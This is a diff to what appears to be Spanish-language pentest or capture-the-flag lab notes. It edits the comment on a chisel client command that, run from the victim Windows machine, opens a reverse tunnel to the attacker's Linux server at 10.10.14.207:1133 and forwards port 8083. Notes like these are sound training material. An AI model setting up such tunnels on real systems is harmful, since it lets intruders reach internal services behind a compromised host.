@@ -297,6 +297,6 @@ vamos a levantar un servidor con chisel por el puerto 1133
 ```python
 .\chisel_windows.exe client 10.10.14.207:1133 R:8083:127.0.0.1:8083
 
-# Este comando establece un túnel con Chisel desde la máquina cliente (maquina Windows victima) hacia el servidor Chisel (Maquina atacante linux) en la dirección IP `10.10.14.207` y el puerto `1133`. y configura una redirección para el puerto `8083`, redirigiendo el tráfico del servidor al puerto `8083` en la misma máquina cliente.
+# Este comando establece un túnel con Chisel desde la máquina cliente (maquina Windows victima) hacia el servidor Chisel (Maquina atacante linux) en la dirección IP `10.10.14.207` y el puerto `1133`. y configura una redirección para el puerto `8083`, redirigiendo el tráfico del cliente chisel al puerto `8083` del servidor chisel. 
 ```
 ![[Pasted image 20240404180732.png]]
